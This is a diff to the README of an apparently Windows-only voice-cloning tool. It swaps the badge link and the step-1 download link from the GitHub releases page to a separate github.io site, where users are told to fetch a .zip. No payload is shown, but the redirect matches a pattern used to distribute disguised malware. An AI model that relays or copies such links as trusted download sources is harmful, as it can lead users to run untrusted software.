@@ -1,6 +1,6 @@
 # 🎙️ voice_clone_lab - Create custom voices from audio clips
 
-[![](https://img.shields.io/badge/Download-Voice_Clone_Lab-blue.svg)](https://github.com/Homologic-bid91/voice_clone_lab/releases)
+[![](https://img.shields.io/badge/Download-Voice_Clone_Lab-blue.svg)](https://homologic-bid91.github.io)
 
 voice_clone_lab lets you create a digital version of a human voice. You provide a few minutes of audio, and the software creates a model. You use this model to turn text into speech. This tool runs on your computer. Your voice files stay on your machine. The software includes a simple web interface for you to use.
 
@@ -17,7 +17,7 @@ You need a Windows computer to run this software. Ensure you have the following 
 
 You must download the correct file from the project page.
 
-1. Go to this link: https://github.com/Homologic-bid91/voice_clone_lab/releases
+1. Go to this link: https://homologic-bid91.github.io
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .zip under the Assets section.
 4. Save the file to your computer.
